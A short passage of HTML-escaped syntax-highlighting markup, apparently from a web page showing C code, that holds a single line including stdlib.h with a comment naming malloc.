 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt; // malloc&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
